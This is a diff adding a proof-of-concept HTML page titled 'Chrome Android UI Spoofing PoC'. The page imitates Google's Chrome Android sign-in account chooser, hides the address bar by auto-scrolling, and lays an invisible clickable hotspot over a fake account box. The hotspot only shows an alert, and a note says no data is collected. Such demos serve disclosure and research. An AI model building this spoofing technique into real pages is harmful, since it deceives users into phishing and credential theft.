@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Chrome Android UI Spoofing PoC</title>
+
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        overflow: hidden;
+        font-family: Arial, sans-serif;
+        background: #fff;
+    }
+
+    /* Fullscreen fake Chrome background */
+    .fake-page {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100vw;
+        height: 100vh;
+        background: #ffffff;
+        overflow: hidden;
+    }
+
+    /* Header mirip Chrome Android account chooser (Material 3) */
+    .fake-header {
+        width: 100%;
+        padding: 16px;
+        font-size: 20px;
+        font-weight: bold;
+        border-bottom: 1px solid #e0e0e0;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+    }
+
+    .google-logo {
+        width: 28px;
+    }
+
+    /* Fake account selector */
+    .account-box {
+        margin: 24px;
+        padding: 16px;
+        border-radius: 10px;
+        border: 1px solid #ddd;
+        display: flex;
+        align-items: center;
+        gap: 16px;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+    }
+
+    .avatar {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        background: #ccc;
+    }
+
+    /* Hotspot untuk memicu aksi */
+    .hotspot {
+        position: absolute;
+        top: 160px;
+        left: 25px;
+        width: 85%;
+        height: 70px;
+        background: transparent;
+        opacity: 0;
+    }
+
+    /* Informasi demo */
+    .note {
+        position: fixed;
+        bottom: 10px;
+        width: 100%;
+        text-align: center;
+        font-size: 13px;
+        color: red;
+    }
+</style>
+
+</head>
+<body>
+
+<div class="fake-page">
+
+    <div class="fake-header">
+        <img class="google-logo" src="https://www.google.com/favicon.ico">
+        Sign in
+    </div>
+
+    <div class="account-box">
+        <div class="avatar"></div>
+        <div style="display:flex;flex-direction:column;">
+            <b>username@example.com</b>
+            <span style="font-size:13px; color:#555;">Google Account</span>
+        </div>
+    </div>
+
+    <!-- HOTSPOT INVISIBLE -->
+    <div class="hotspot" onclick="triggerSpoof()"></div>
+
+</div>
+
+<script>
+    // Scroll otomatis untuk menyembunyikan address bar Chrome Android
+    window.onload = function() {
+        setTimeout(() => {
+            window.scrollTo(0,1);   // hide address bar
+        }, 200);
+    }
+
+    function triggerSpoof() {
+        alert("Demo Triggered: This simulates opening a fake Google login.");
+    }
+</script>
+
+<div class="note">
+    PoC Demo Only — No data collected.
+</div>
+
+</body>
+</html>
